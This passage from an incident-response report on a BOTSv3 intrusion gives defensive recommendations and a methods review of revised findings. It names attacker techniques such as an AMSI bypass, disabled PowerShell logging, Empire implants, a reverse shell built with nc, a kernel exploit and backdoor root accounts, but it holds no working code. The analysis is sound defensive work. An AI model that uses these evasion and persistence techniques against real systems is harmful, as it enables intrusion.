of delivery, nothing about the transaction is external. Restrict anonymous link creation to roles
that need it, expire links by default, and alert on inheritance-breaking (DO-1.3). Pair it with
conditional access and impossible-travel enforcement on the sign-in side, which would have challenged
the 09:51:09 Hong Kong authentication.

**8. Restrict web-delivered shortcut files.** *(§3.2)* The Mark-of-the-Web tag was correctly applied
and did not prevent the handoff from `browser_broker.exe` to `powershell.exe`. Blocking or quarantining
`.lnk` files delivered from the Internet zone at the gateway or endpoint removes this delivery path
outright; a shortcut file has no legitimate reason to arrive as a web download.

**9. Constrain and monitor PowerShell.** *(§4.1)* The stager's first act was to bypass AMSI and
disable ScriptBlockLogging, blinding the two telemetry sources a defender would use to
inspect it. Two consequences follow. Ship PowerShell logs off-host in near real time so that
disabling logging locally does not retroactively remove evidence, and alert on the act of
disabling itself, a stronger and less evadable signal than the payload it conceals.
Constrained Language Mode and script signing raise the cost further.

**10. Monitor privileged account creation on both platforms.** *(§4.4, §7.7)* Both backdoor accounts
were named to survive a human eyeballing an account list, `svcvnc` and `tomcat7`. Name-based review
is not a control. What is: alerting on any local account creation on a workstation, on any addition
to a privileged local group, and on the appearance of any second UID 0 account on a Linux host.
The last of these is trivial to implement and has essentially no benign form.

### 9.3 Operational practice

**11. Hunt for more than one implant.** *(§4.5)* FYODOR-L ran two independent Empire sessions in
parallel for over fifty minutes, to the same infrastructure, at two different privilege levels. An
analyst who found the user-context beacon, terminated it and moved on would have left SYSTEM-level
attacker access running. Session enumeration should be keyed on process identity, not on destination.
This is why DO-2.2 aggregates on `ProcessGuid` (detection pack); containment should not be declared on
the strength of the first implant found.

**12. Preserve command-line and process-lineage logging as a first-class requirement.** *(§3.2, §4.4,
§7.2)* Three of the most load-bearing findings in this report exist only because command lines and
parent process identity were captured: that the `.lnk` was executed by the browser broker rather than
by a double-click; that the `svcvnc` password was in plaintext; and that every command run on hoth
originated from `iexeplorer.exe` on FYODOR-L, which is what fixes the operator's console to a single
host. None of these are visible without full command-line capture.

**13. Close the register.** *(§8.4)* Twelve leads are parked with the analytic that would close each.
In an operational context this is the post-incident work queue; leads 4 (second-session trigger),
6 (the earlier `tomcat7`) and 12 (the inbound transfer content) carry the most residual risk, because
each represents attacker capability or access whose extent is not yet bounded.

---
## §10 Analytical Notes

> **In one line:** where this investigation got it wrong the first time, and what corrected it.

This section is about method rather than about the attacker, and it is included for one reason: the
findings above could be reached by following someone else's answers, and this is the record of them
being reached otherwise — including the parts that went wrong first.

### 10.1 One six-minute window, four revisions

The period 10:09–10:16 on FYODOR-L was assessed four times.

An early pass labelled it "OPSEC cleanup at 10:16:54" with no supporting command line. A full Sysmon
review of the window found no cleanup command of any kind, and the label was withdrawn. Extending the
window backwards then built an attractive causal story — persistence established, manually verified,
then used to launch a second implant — but a `ProcessGuid`/`ParentProcessGuid` comparison showed the
two executions had disjoint lineages: the story was coherent and wrong. Changing the question from
"what launched this?" to "is this the same actor?" broke the impasse — following the `ProcessGuid`
forward showed sustained beaconing on the same interval profile established elsewhere, and attribution
became Confirmed without the trigger mechanism ever being resolved. A later full-day scan then found
what the second reading's narrower search had missed: `schtasks.exe /Delete /TN Updater /F` at
10:16:54, the exact second the original label had named. The command was real; it deleted the
operator's own scheduled task 84 seconds after that task had delivered a resident SYSTEM implant — not
a log-clearing action, but not nothing either.

**What this cost, in order:** conflating attribution with mechanism stalls an investigation — the two
are separately assessable, and "I don't know what triggered it" does not weaken "I know who it is." A
narrative that connects every timestamp is not thereby supported by the evidence; what broke the third
reading was a field comparison, not a better story. Withdrawing a label for lack of evidence is
correct, but withdrawal answers only the specific claim tested — it does not certify the window is now
understood, as the fourth reading showed. A near-identical temptation appeared later in the same
host's timeline, running the opposite direction: `cleanmgr.exe /autoclean`, 23 seconds after the second
reverse shell, looked like attacker cleanup and was in fact a native Windows scheduled task sharing its
service host with the attacker's own — confirmed by the same lineage check, not excluded by assumption.
Coincident timing with an attacker milestone is neither confirmation nor refutation on its own.

### 10.2 Coverage before conclusions

"No evidence of X" is only a finding if the source that would show X was checked for coverage first.
This investigation got that wrong once: an early assessment treated osquery's collection start as
lagging the Phase 3 window by hours, making the kernel exploit's result a blind spot — a belief carried
forward unverified across sessions. It was false; osquery covers the window in real time, with the FIM
record for `/tmp/colonel` landing roughly 30 seconds after the staging command, and the escalation
result moved to Confirmed. It got the same check right once: `bash_history` on hoth was confirmed to
have 83 records bracketing the attack window, all legitimate, before its silence about the attacker was
used as evidence the attacker never opened an interactive session.

### 10.3 Three ways this data invites a wrong answer

HTTP 200 reports only that an injected OGNL expression evaluated — it carries no information about
whether the shell command it spawned succeeded, and every command in Phase 3 returned 200, including
the `useradd` that failed (§7.3). A process executing proves an exploit ran, not that it worked;
escalation is proven only by the child process's own uid (§7.5). And transfer volume does not indicate
direction: the reverse-shell sessions moved ~1.1 MB one way and ~40 KB the other, and reading raw
volume alone flags the larger flow as exfiltration when it is in fact inbound tool delivery (§7.8).
Direction is a field, not an inference.

### 10.4 A correlation that did not survive one field comparison

`chrome.exe` on FYODOR-L reached hoth 28 times in the window around the hdoor sweep, and the
correlation looked like the operator mining browsing history to select a target. One field
comparison falsified the causal claim: the exploited endpoint appears nowhere in that browsing
session (§6.3). The correlation itself was real — the browsing happened, to the right host, in the
right window — and only the causal story built on it was false. Correlations strong enough to be
attractive are exactly the ones that need a falsification test; weak correlations don't tempt anyone.

### 10.5 Source artefacts and circular baselines

Linux recycles PIDs; no link in this report rests on a PID number alone (§7.5). Collection order is
not execution order — an osquery batch shares one `_time`, and FIM timestamps are collection-time
upper bounds, not write instants (§8.1). And BOTSv3 is an event-capture dataset built around this
incident, not a steady-state operational baseline: computing a false-positive rate by running a
detection against the same capture that contains the events it targets is circular, so no in-dataset
FP rate appears anywhere in this report. Where FP guidance would normally sit, the rules describe what
benign activity resembles instead, and one rule (DO-3.3) is marked N/A for exactly this reason rather
than assigned a fabricated number.

### 10.6 Confidence, propagated

Every claim in this report carries one of five labels — Confirmed, High confidence, Medium confidence,
Low confidence/Indicative, Parked — and downgrades or upgrades are stated once, where they occur,
rather than silently absorbed. The harder discipline is that a revision propagates everywhere it
touches: re-examining the beacon count by `ProcessGuid` rather than as a single aggregate changed the
executive summary, the interface table in §5, the session inventory, a detection's aggregation key, a
recommendation, and every IOC/ATT&CK entry that referenced session counts. Cross-document consistency
after a revision is harder than the analytical judgment that produced it, and it is where reports
usually fail — the finding gets corrected where it was found and left standing everywhere else.

### 10.7 Why this is a hunt, not a walkthrough

Two rules were kept throughout. Every hypothesis originated independently of any published answer set
— from domain knowledge, from evidence already confirmed in a prior phase, or from external threat
intelligence — because a hypothesis sourced from an answer key produces a search that confirms it and
demonstrates nothing. And every pivot required a concrete evidence-chain connection to a previously
confirmed step; anomalies with no kill-chain placement went to the Parked register (§8.4) rather than
into the narrative. §10.1 is the observable consequence of both: an investigation working from an
answer key does not revise the same six-minute window four times, because it does not need to. The
revisions are the evidence the conclusions were derived.

### 10.8 Register of withdrawn and revised assessments

| Original assessment | Final assessment | What changed it | § |
|---|---|---|---|
| `bgist` compromise inferred, vector unknown (High confidence) | **Confirmed**, vector established as credential theft | Impossible-travel sign-in pair plus single-account targeting from the Hong Kong address | §3.1 |
| `tomcat7` creation *likely failed* (single-attempt reading) | **Confirmed two-stage**: failure, escalation, success | osquery `euid` evidence for the first attempt plus the authoritative syslog `new user` record for the second | §7.3, §7.7 |
| Kernel exploit execution result = *coverage blind spot* | **High confidence**, escalation succeeded | The blind-spot belief was falsified: osquery covers 11:08–11:17 in real time | §7.0, §7.5 |
| osquery collection lagged the event window by ~4 hours | **Withdrawn** — collection is timely | FIM record for `/tmp/colonel` lands ~30 s after the staging command | §7.0 |
| "OPSEC cleanup" at 10:16:54 | **Withdrawn** — no supporting telemetry exists | Full EventID 1 review of the window found no cleanup command of any kind | §4.5, §10.1 |
| 10:11:00 execution = operator verifying persistence | **Withdrawn** — Task Scheduler service behaviour | Parent is the Schedule service host, created in the same second as the task | §4.5, §10.1 |
| 10:15:27 stager = second stage of the registry loader | **Withdrawn** — an independent parallel session | Disjoint `ProcessGuid`/`ParentProcessGuid` lineages | §4.5, §10.1 |
| Reverse shell replaced the HTTP injection channel (Medium confidence) | **Withdrawn** — the channel built the shell | The `mknod`/`nc` construction commands are themselves HTTP-injected payloads | §7.8 |
| Browser history supplied the exploitation path | **Falsified** | `uri_path` comparison: the exploited endpoint appears nowhere in the browsing session | §6.3 |
| Non-root execution context inferred from response length | **Superseded** — retained as a consistency check | Direct osquery `uid=111` evidence | §7.1 |
| Kernel-version match inferred from response length | **Superseded** — textual match | The exploit source's own comments name `4.4.0-116-generic` | §7.4 |
| `tomcat7` did not exist before the attack chain | **Confirmed** it pre-existed; origin **Parked** | Account snapshots at 09:35 (absent) and 10:24 (present) with no corresponding `useradd` syslog record | §7.3, §8.4 |
| 2,074 beacons attributed to a single session that "never migrated to SYSTEM" | **Withdrawn** — four concurrent sessions summed, truncating 46% of traffic and a fifth session entirely | Aggregation by `ProcessGuid` and widening the query window to 09:00–18:00 | §4.2, §4.7 |
| `Updater` deletion read first as unsupported "cleanup," then as no event of interest | **Corrected a second time** — removal of a delivery vehicle after its payload was already active | Locating `schtasks /Delete` in a full-day scan after the narrow window found nothing | §4.5, §10.1 |
| Resident SYSTEM implants hold access but never act | **Revised** — one (C52C) is activated once, 100 minutes in, to run `tar` | Tracing the parent `ProcessGuid` of the 11:52:16 `tar.exe` process | §4.7 |
| `cleanmgr.exe /autoclean`, 23 s after the second reverse shell | **Assessed and excluded** — native `SilentCleanup` task, coincidental timing | Parent-process lineage and the standard `DismHost/TiWorker/TrustedInstaller` chain | §4.7, §10.1 |

### 10.9 Closing

This intrusion used no zero-day, no custom malware, and no novel technique: a stolen credential, a
public exploit for an application framework unpatched for seventeen months, a public exploit for an
unpatched kernel, a compiler left on a production server, a firewall disabled with one command, and no
segmentation between the user and server networks. From first execution to the last confirmed
collection action spans just under two hours.

What earned this report its length was not the attacker's sophistication but the number of places the
data invited a confident wrong answer — five of them are listed in §10.8, each caught by a specific
field comparison rather than by a better guess. That table is what disciplined revision looks like
written down, rather than tidied away.

---

*The earlier independent intrusion — the origin of the pre-existing `tomcat7` (UID 0) account on hoth,
created between 09:35 and 10:24 by a method that invokes no `useradd` — is Parked (§8.4) and not
analysed in this report.*
